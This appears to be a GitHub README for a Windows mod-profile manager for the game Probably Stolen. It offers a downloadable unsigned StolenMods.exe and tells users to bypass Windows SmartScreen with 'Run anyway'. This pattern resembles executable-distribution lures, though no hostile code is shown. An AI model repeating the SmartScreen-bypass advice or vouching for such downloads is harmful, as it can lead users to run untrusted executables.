<p align="center">
  <img src="https://i.postimg.cc/Vk6r0SwR/banner.png" alt="Probably Stolen ModProfile — Windows Mod Profiles and Mod Manager" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Mod%20Profile%20Manager-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-profiles--nov26--c3-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Probably Stolen ModProfile — organize and switch local mod sets

**Probably Stolen** launched with modding support, including Steam Workshop integration and a modding API. The result is a growing mix of workshop items, manually installed packages and community add-ons. If you experiment with different combinations, it becomes hard to remember which files went with which setup.

**Stolen ModProfile** is a Windows utility intended to help you keep named sets of *local* mod files and return to a known working configuration. It is for players who want a clean vanilla setup for troubleshooting, a small quality-of-life profile for regular play and a separate profile for testing new mods without constantly copying folders by hand.

It is not a cheat engine, mod download site, game patcher or replacement for the game's own mod safety warnings.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Manual mod never appears in in-game Modding menu | Double-nested archive directory (`Mods\SomeMod\SomeMod\...`) | Flatten mod folder structure inside `Probably Stolen\Mods\` |
| Demo-era DLL crashes full 1.0.0.6+ release | Legacy loader DLL incompatible with full-release modding API | Switch to a clean `Vanilla` profile and remove demo-era DLLs |
| Two mods conflict or duplicate items | Manual copy left alongside Steam Workshop subscription | Isolate mods into separate named profiles (`Clean`, `QoL`, `Testing`) |
| Hard to revert after testing experimental mods | Unorganized files mixed inside `Probably Stolen\Mods\` | Snapshot working local mod sets before adding new packages |

## Download

[**Download StolenMods.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/StolenMods.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `StolenMods.exe`? (Automatic checks in ~2 seconds)

- Locates `Probably Stolen\Mods` across Steam libraries and detects double-nested mod folders.
- Lets you organize local mod sets into switchable profiles (`Clean`, `Quality-of-life`, `Testing`).
- Keeps Steam Workshop subscriptions and protected base game files completely untouched.
- Creates a backup snapshot of your active `Mods\` directory before switching profiles.

### Sample Diagnostic Output

```text
[StolenMods] Auditing Probably Stolen local Mods & Profiles...
[OK]   Game Install     : D:\SteamLibrary\steamapps\common\Probably Stolen
[OK]   Active Mods Dir  : Mods\ (5 local mod folders)
[WARN] Nesting Check    : Mods\ShopOverhaul\ShopOverhaul\ (Extra wrapper folder detected)
[OK]   Saved Profiles   : Clean (0 mods), DailyQoL (3 mods), Testing (5 mods)
```

The ZIP release is named `StolenMods.zip` and contains `StolenMods.exe`. The link goes directly to the downloadable release asset.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `StolenMods.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Install and get started

1. Exit **Probably Stolen** and close any other mod manager that is currently changing its files.
2. Download `StolenMods.zip` using the link above.
3. Extract the ZIP and open `StolenMods.exe` from the extracted folder.
4. Select the local game directory and the mod folder you want to work with.
5. Make a copy of the current configuration before changing any files.
6. Create a named profile, such as `Clean`, `Quality-of-life` or `Testing`.
7. Start the game after the profile has been applied and verify that the intended mods are shown by the game's own mod menu.

Do not run profile changes while the game is running. An open game can hold files in memory, and a profile change may not take effect until restart.

## Finding your Probably Stolen mod folder

A typical Steam installation is inside a Steam Library's `steamapps\common` directory, for example:

```text
C:\Program Files (x86)\Steam\steamapps\common\Probably Stolen\Mods\
```

Your Steam library might be on another drive. In Steam, right-click the game, open **Properties → Installed Files → Browse**, and check the folder shown there.

Not every mod uses the same method. Some use the game's built-in `Mods` folder, others rely on a community loader, and Steam Workshop content is managed by Steam. **Do not mix these approaches without checking the individual mod's instructions.**

## What profiles are useful for

### A clean profile for troubleshooting

When Probably Stolen crashes after a mod update, shows unexpected behavior or refuses to load a save, the first question is whether the problem still happens without third-party modifications. A named clean setup makes that comparison easier, provided the mod manager safely preserves the files it changes.

Remember that running a save created with mods in an unmodded game may still cause issues. Back up saves separately before testing.

### A small quality-of-life profile

Keep a short list of mods you use regularly, separate from experimental additions. A mod profile should record the specific local files selected; a folder name alone cannot establish that a mod works with the current game build.

### A testing profile for new mods

If you are trying a newly published mod, install it according to its author's instructions and test it alone before combining it with others. A profile can help you return to a known set of files. It cannot determine that an arbitrary DLL is safe or compatible just because the file exists.

### Recover your previous file arrangement

Before switching profiles, preserve the current local mod folders. The safest rollback method is to restore that copy rather than deleting unknown files or changing the game's core binaries. Avoid manipulating Steam-managed Workshop storage directly, since Steam may redownload or repair those files.

## Probably Stolen mods not loading? Things to check

**The mod doesn't appear in the in-game menu.** Verify that the extracted folder structure matches the author's instructions. Watch for an extra directory added by ZIP extraction, such as `Mods\SomeMod\SomeMod\...` when only one level was expected.

**A mod worked in the demo but not the full game.** The full release introduced its own mod support. A demo-era DLL or loader may target a different game version. Read the current mod page and do not assume compatibility.

**Two mods change the same behavior.** Test each independently on a backed-up save. An ordinary file manager can flag duplicate names or file paths but cannot reliably infer all runtime interactions between different mods.

**Steam Workshop content keeps changing.** Manage your subscribed Workshop items through Steam. ModProfile is intended for local file sets; do not move Steam's Workshop caches around to force a particular version.

**The game shows a mod safety warning.** Take it seriously. Mod packages can contain executable code. Read the warning, check the mod author's source and reputation, and avoid running unknown files simply because a README tells you to.

## Compatibility and limits

- Intended for Windows PCs running a legitimate installed copy of Probably Stolen.
- Mod packages and game versions change frequently. Each mod author is responsible for documenting their compatibility.
- Switching local file sets does not install dependencies, resolve every conflict or certify a mod's safety.
- It does not download third-party mods on your behalf or modify Steam Workshop subscriptions.
- Back up your saves separately before testing new mods; an incompatible mod can affect save data.

## FAQ

**Can it install every Nexus mod?**

No single workflow fits every file type or loader. Check the requirements on each mod page first. Some Nexus Mods packages may already be managed by Vortex or an in-game manager.

**Does it bypass game security checks?**

No. The game's own mod security controls and prompts should be respected.

**Do I need to replace game files?**

You should not need to edit or replace the game's executable for ordinary local profile management. Avoid any instructions that call for turning off security software.

**Can profiles guarantee a crash-free game?**

No. They help isolate changes. Driver problems, game bugs and incompatible saves can still cause crashes.

## Links

- [Probably Stolen on Steam](https://store.steampowered.com/app/4348910/Probably_Stolen/)
- [Community Mod Manager on Nexus Mods](https://www.nexusmods.com/probablystolen/mods/41)
- [Vortex game extension for Probably Stolen](https://www.nexusmods.com/site/mods/2508)

## More Windows Game Diagnostic Tools

- [ProbablyStolen-SaveRepair](../ProbablyStolen-SaveRepair) — Probably Stolen `.es3` save slot recovery & backup check
- [KCD2-ModOrderInspector](../KCD2-ModOrderInspector) — Kingdom Come: Deliverance II `mod.manifest` & load order check
- [BG3-ModSettingsDoctor](../BG3-ModSettingsDoctor) — Baldur's Gate 3 `modsettings.lsx` & `.pak` audit
- [SlayTheSpire2-ModSaveAudit](../SlayTheSpire2-ModSaveAudit) — Slay the Spire 2 Early Access mod & save audit

Unofficial community project, not affiliated with Questing Goose Studio, tinyBuild, Nexus Mods or Valve. Review the release and mod sources before installing any executable or third-party package.
 
 
 
 
 
 
 
 
